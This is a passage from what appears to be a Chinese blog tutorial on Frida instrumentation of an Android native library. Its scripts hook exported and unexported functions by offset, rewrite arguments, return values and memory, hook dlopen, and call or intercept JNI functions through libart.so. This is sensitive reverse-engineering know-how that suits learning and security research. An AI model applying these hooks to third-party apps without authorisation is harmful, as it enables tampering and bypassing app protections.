class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> re;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="枚举导入导出表">枚举导入导出表</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> imports = <span class="title class_">Module</span>.<span class="title function_">enumerateImports</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; imports.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(imports[i].<span class="property">name</span> == <span class="string">&quot;strncat&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(imports[i]));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(imports[i].<span class="property">address</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">exports</span> = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">exports</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="built_in">exports</span>[i]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// var helloAddr = Module.findExportByName(&quot;libxiaojianbang.so&quot;, &quot;Java_com_xiaojianbang_app_NativeHelper_helloFromC&quot;);</span></span><br><span class="line">    <span class="comment">// console.log(helloAddr);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//枚举符号表 Module.enumerateSymbols(&#x27;xxx.so&#x27;)；</span></span><br></pre></td></tr></table></figure><h2 id="Hook导出函数">Hook导出函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;Java_com_xiaojianbang_app_NativeHelper_add&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(helloAddr);</span><br><span class="line">    <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(args[0]);</span></span><br><span class="line">                <span class="comment">//console.log(args[1]);</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>]);</span><br><span class="line">                <span class="comment">//console.log(this.context.x2);</span></span><br><span class="line">                <span class="comment">//console.log(args[3]);</span></span><br><span class="line">                <span class="comment">//console.log(args[4].toInt32());</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(retval);</span></span><br><span class="line">                <span class="comment">//console.log(&quot;retval&quot;, retval.toInt32());</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//toInt32 转换为32有符号整数</span></span><br></pre></td></tr></table></figure><h2 id="修改函数参数返回值">修改函数参数返回值</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;Java_com_xiaojianbang_app_NativeHelper_add&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(helloAddr);</span><br><span class="line">    <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="comment">//修改函数参数的时候，如果参数是字符串 没法修改</span></span><br><span class="line">                args[<span class="number">2</span>] = <span class="title function_">ptr</span>(<span class="number">1000</span>); <span class="comment">//new NativePointer()  修改参数为1000</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>].<span class="title function_">toInt32</span>());</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">3</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">4</span>]);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                retval.<span class="title function_">replace</span>(<span class="number">20000</span>);   <span class="comment">//修改返回值为2000</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval&quot;</span>, retval.<span class="title function_">toInt32</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改参数用ptr() 修改返回值 用 .replace()</span></span><br></pre></td></tr></table></figure><h2 id="Hook未导出函数">Hook未导出函数</h2><p>当是32位.so是，为导出函数的地址+1，也可以看函数十六进制是否是2个 如果是两个就是thumb</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest4</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">    <span class="keyword">var</span> funcAddr = soAddr.<span class="title function_">add</span>(<span class="number">0x23F4</span>); <span class="comment">//函数地址计算 thumb+1 ARM不加</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(funcAddr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(funcAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(funcAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(retval));   <span class="comment">//打印出内存结构 </span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取指针参数返回值">获取指针参数返回值</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest5</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">    <span class="keyword">var</span> sub_208C = soAddr.<span class="title function_">add</span>(<span class="number">0x208C</span>); <span class="comment">//函数地址计算 thumb+1 ARM不加</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sub_208C);</span><br><span class="line">    <span class="keyword">if</span>(sub_208C != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(sub_208C,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">args1</span> = args[<span class="number">1</span>];   <span class="comment">//回去第二个参数值</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="comment">//修改内存数据</span></span><br><span class="line">                <span class="title function_">ptr</span>(<span class="variable language_">this</span>.<span class="property">args1</span>).<span class="title function_">writeByteArray</span>(<span class="title function_">hexToBytes</span>(<span class="string">&quot;0123456789abcdef0123456789abcdef&quot;</span>));</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(<span class="variable language_">this</span>.<span class="property">args1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改内存数据">修改内存数据</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest7</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(soAddr);</span><br><span class="line">    <span class="keyword">if</span>(soAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="comment">//读取指定地址的字符串 dump指定内存</span></span><br><span class="line">        <span class="comment">//console.log(soAddr.add(0x2C00).readCString());</span></span><br><span class="line">        <span class="comment">//console.log(hexdump(soAddr.add(0x2C00)));</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//读内存</span></span><br><span class="line">        <span class="comment">//var strByte = soAddr.add(0x2C00).readByteArray(16); </span></span><br><span class="line">        <span class="comment">//console.log(strByte);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//写内存</span></span><br><span class="line">        <span class="comment">//so|Addr.add(0x2C00).writeByteArray(stringToBytes(&quot;xiaojianbang&quot;)); </span></span><br><span class="line">        <span class="comment">//读取指定地址的字符串 dump指定内存</span></span><br><span class="line">        <span class="comment">//console.log(hexdump(soAddr.add(0x2C00)));  </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//var bytes = Memory.readByteArray(soAddr.add(0x2C00), 16); //原先API</span></span><br><span class="line">        <span class="comment">//console.log(bytes);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook-dlopen">Hook dlopen</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> dlopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(dlopen);</span><br><span class="line">    <span class="keyword">if</span>(dlopen != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(dlopen,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> soName = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(soName);</span><br><span class="line">                <span class="keyword">if</span>(soName.<span class="title function_">indexOf</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>) &#123; <span class="title function_">hookTest5</span>() &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新版本hook dlopen</span></span><br><span class="line">    <span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(android_dlopen_ext);</span><br><span class="line">    <span class="keyword">if</span>(android_dlopen_ext != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(android_dlopen_ext,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> soName = args[<span class="number">0</span>].<span class="title function_">readCString</span>();  <span class="comment">//dlopen函数第一个参数是.so路径</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(soName);</span><br><span class="line">                <span class="keyword">if</span>(soName.<span class="title function_">indexOf</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>) &#123; <span class="title function_">hookTest5</span>() &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">hookTest6</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><h2 id="主动调用JNI函数">主动调用JNI函数</h2><p>当.so文件某个函数把cstring转换为jstring对象(newStringUtf)，不能打印内存数据，需要把他转化为cstring。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest8</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> funcAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;Java_com_xiaojianbang_app_NativeHelper_helloFromC&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(funcAddr);</span><br><span class="line">    <span class="keyword">if</span>(funcAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(funcAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line">                <span class="keyword">var</span> jstr = env.<span class="title function_">newStringUtf</span>(<span class="string">&quot;bbs.125.la&quot;</span>);  <span class="comment">//主动调用jni函数 cstr转jstr</span></span><br><span class="line">                retval.<span class="title function_">replace</span>(jstr);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> cstr = env.<span class="title function_">getStringUtfChars</span>(jstr); <span class="comment">//主动调用 jstr转cstr</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(cstr.<span class="title function_">readCString</span>());</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(cstr));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook-libart-so-来Hook-jni相关函数">Hook <a href="http://libart.so">libart.so</a> 来Hook jni相关函数</h2><p>libart.so是art虚拟机，jni函数可以在libart.so的符号表中找到,也就是jni函数都在libart.so中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest10</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> artSym = <span class="title class_">Module</span>.<span class="title function_">enumerateSymbols</span>(<span class="string">&quot;libart.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">NewStringUTFAddr</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; artSym.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(artSym[i].<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;CheckJNI&quot;</span>) == -<span class="number">1</span> &amp;&amp; artSym[i].<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;NewStringUTF&quot;</span>) != -<span class="number">1</span>)&#123;    <span class="comment">//libart中jni函数是不带有CheckJNI的</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(artSym[i]));</span><br><span class="line">            <span class="title class_">NewStringUTFAddr</span> = artSym[i].<span class="property">address</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">NewStringUTFAddr</span> != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(<span class="title class_">NewStringUTFAddr</span>,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">1</span>].<span class="title function_">readCString</span>());</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Hook-jni函数-计算地址方式">Hook jni函数 (计算地址方式)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest9</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//查看app是多少位 64位指针8字节 32位指针4字节</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Process.arch: &quot;</span>, <span class="title class_">Process</span>.<span class="property">arch</span>);  </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>()));</span><br><span class="line">        <span class="comment">//(*(*a1 + 1336LL))(a1, a2);</span></span><br><span class="line">        <span class="comment">//*a1</span></span><br><span class="line">        <span class="keyword">var</span> envAddr = <span class="title function_">ptr</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="property">handle</span>).<span class="title function_">readPointer</span>();</span><br><span class="line">        <span class="comment">//*(*a1 + 1336LL)</span></span><br><span class="line">        <span class="comment">//这个jni函数相对偏移地址 0x538 (通过看jni.h--&gt;（在结构体中的位置-1）*4或8)</span></span><br><span class="line">        <span class="keyword">var</span> newStringUtfAddr = envAddr.<span class="title function_">add</span>(<span class="number">0x538</span>).<span class="title function_">readPointer</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newStringUtfAddr&quot;</span>, newStringUtfAddr);</span><br><span class="line">        <span class="keyword">if</span>(newStringUtfAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(newStringUtfAddr,&#123;</span><br><span class="line">                <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">1</span>].<span class="title function_">readCString</span>());</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="so层主动调用任意函数">so层主动调用任意函数</h2><p>Java.vm.tryGetEnv要么放在API中(Interceptor.attach)，要么用Java.perform包起来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest11</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//拿到函数地址</span></span><br><span class="line">        <span class="keyword">var</span> funcAddr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x23F4</span>);</span><br><span class="line">        <span class="comment">//声明函数指针</span></span><br><span class="line">        <span class="keyword">var</span> func = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(funcAddr, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">        <span class="keyword">var</span> env = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;env: &quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(env));</span><br><span class="line">        <span class="keyword">if</span>(env != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> jstr = env.<span class="title function_">newStringUtf</span>(<span class="string">&quot;abcgda&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> cstr = <span class="title function_">func</span>(env, jstr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(cstr.<span class="title function_">readCString</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">hexdump</span>(cstr));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="替换so层某个函数的功能">替换so层某个函数的功能</h2><p>使用 Interceptor.replace(target, replacement[, data])</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 